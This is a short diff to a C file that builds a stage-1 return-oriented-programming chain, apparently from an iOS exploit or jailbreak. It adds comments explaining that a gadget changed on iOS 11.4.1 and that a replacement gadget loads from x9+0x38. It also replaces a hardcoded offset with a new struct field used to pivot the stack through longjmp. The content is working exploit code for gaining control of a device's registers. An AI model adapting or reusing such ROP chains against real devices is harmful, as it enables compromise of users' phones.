@@ -109,6 +109,9 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	0x199019920      20013fd6       blr x9              <= will branch to [x8]->0x50
 
 	This means that the first value in our stack needs to point to a place where +0x50 the new func pointer will be found
+	While trying to get this running on 11.4.1 we noticed that they switched to x22 for that gadget so we can't use it anymore.
+	Luckly sparkey found another one which is basically doing that same but loading from x9, 0x38 instead of x9, 0x50.
+	So we will account for that with a new variable in the offset struct.
 
 	[2]:
 	Next we jump to longjmp to pivot and get more control over our registers
@@ -196,7 +199,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	
 
 	ROP_SETUP(offsets->stage1_ropchain);
-	ADD_OFFSET_GADGET(0);								   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
+	ADD_OFFSET_GADGET(offsets->pivot_x21_x9_offset);	   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
 	ADD_GADGET();										   // 0x08		[2] x20 [3] x5/sixth arg
 	ADD_GADGET();										   // 0x10		[2] x21 [3] x6/seventh arg
 	ADD_GADGET();										   // 0x18		[2] x22 [3] x4/fifth arg 
